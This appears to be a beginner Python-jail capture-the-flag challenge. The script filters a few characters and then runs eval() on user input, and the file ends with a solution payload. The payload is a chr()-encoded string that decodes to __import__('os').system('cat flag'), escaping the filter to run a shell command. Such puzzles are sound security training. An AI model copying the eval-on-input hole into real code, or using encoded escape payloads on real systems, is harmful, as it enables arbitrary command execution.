def filter(s):
    not_allowed = set('"\'`ib')
    return any(c in not_allowed for c in s)
 
WELCOME = '''
  _                _                           _       _ _   _                _ __ 
 | |              (_)                         (_)     (_) | | |              | /_ |
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
              __/ |                          _/ |                                  
             |___/                          |__/                                                                                      
'''
 
print(WELCOME)
 
print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if filter(input_data):
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))

#help() --> +
# !/bin/bash
#-----------------------------------------------
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41))